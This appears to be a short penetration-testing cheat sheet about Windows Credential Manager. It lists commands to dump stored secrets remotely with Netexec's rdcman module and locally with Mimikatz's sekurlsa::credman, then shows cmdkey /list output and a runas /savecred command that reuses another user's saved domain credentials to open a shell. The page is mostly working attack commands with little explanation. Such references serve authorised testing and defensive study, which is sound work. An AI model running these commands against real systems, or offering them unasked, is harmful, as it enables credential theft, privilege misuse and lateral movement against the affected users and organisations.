# Credential Manager

Windows Credential Manager is a built-in feature that securely stores sensitive login information for websites, applications, and networks. It houses login credentials such as usernames, passwords, and web addresses

### Dumping secrets

{% tabs %}
{% tab title="Netexec" %}
```sh
# Remote dumping
nxc smb <IP> -u <USER> -p <PASSWORD> -M rdcman
```
{% endtab %}

{% tab title="Mimikatz" %}
```sh
# Local dumping
sekurlsa::credman
```
{% endtab %}
{% endtabs %}

### Re-use stored passwords

```sh
# Enumerate credentials stored in the current user's profile
cmdkey /list

# Example output => Domain credentials used for interactive sessions 
Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles

# If we come across the above type of credentials, we can reuse them
runas /savecred /user:SRV01\mcharles cmd
```
